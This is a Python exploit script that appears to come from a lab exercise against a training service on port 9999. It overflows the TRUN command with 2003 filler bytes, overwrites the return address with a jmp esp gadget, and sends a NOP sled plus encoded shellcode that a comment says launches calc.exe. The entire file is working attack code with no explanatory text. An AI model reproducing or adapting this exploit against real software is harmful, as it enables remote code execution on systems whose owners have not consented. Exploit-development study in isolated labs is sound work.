#!/usr/bin/python
import socket
import struct
host = '192.168.56.102'
port = 9999

# shellcode to open calc.exe

shellcode =  b""
shellcode += b"\xb8\xa9\xb9\x45\x2f\xd9\xe9\xd9\x74\x24\xf4"
shellcode += b"\x5a\x31\xc9\xb1\x31\x83\xea\xfc\x31\x42\x0f"
shellcode += b"\x03\x42\xa6\x5b\xb0\xd3\x50\x19\x3b\x2c\xa0"
shellcode += b"\x7e\xb5\xc9\x91\xbe\xa1\x9a\x81\x0e\xa1\xcf"
shellcode += b"\x2d\xe4\xe7\xfb\xa6\x88\x2f\x0b\x0f\x26\x16"
shellcode += b"\x22\x90\x1b\x6a\x25\x12\x66\xbf\x85\x2b\xa9"
shellcode += b"\xb2\xc4\x6c\xd4\x3f\x94\x25\x92\x92\x09\x42"
shellcode += b"\xee\x2e\xa1\x18\xfe\x36\x56\xe8\x01\x16\xc9"
shellcode += b"\x63\x58\xb8\xeb\xa0\xd0\xf1\xf3\xa5\xdd\x48"
shellcode += b"\x8f\x1d\xa9\x4a\x59\x6c\x52\xe0\xa4\x41\xa1"
shellcode += b"\xf8\xe1\x65\x5a\x8f\x1b\x96\xe7\x88\xdf\xe5"
shellcode += b"\x33\x1c\xc4\x4d\xb7\x86\x20\x6c\x14\x50\xa2"
shellcode += b"\x62\xd1\x16\xec\x66\xe4\xfb\x86\x92\x6d\xfa"
shellcode += b"\x48\x13\x35\xd9\x4c\x78\xed\x40\xd4\x24\x40"
shellcode += b"\x7c\x06\x87\x3d\xd8\x4c\x25\x29\x51\x0f\x23"
shellcode += b"\xac\xe7\x35\x01\xae\xf7\x35\x35\xc7\xc6\xbe"
shellcode += b"\xda\x90\xd6\x14\x9f\x6f\x9d\x35\x89\xe7\x78"
shellcode += b"\xac\x88\x65\x7b\x1a\xce\x93\xf8\xaf\xae\x67"
shellcode += b"\xe0\xc5\xab\x2c\xa6\x36\xc1\x3d\x43\x39\x76"
shellcode += b"\x3d\x46\x5a\x19\xad\x0a\xb3\xbc\x55\xa8\xcb"

payload = ''
payload += 'TRUN /.:/'
payload += 'A' * 2003

# 625011AF jmp esp (Stack pointer)

payload += struct.pack("I",0x625011AF)
payload += '\x90' * 16
payload += shellcode
payload += '\x90' * (3000 - len(payload))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.recv(1024)
s.send(payload)
s.recv(1024)
s.close()
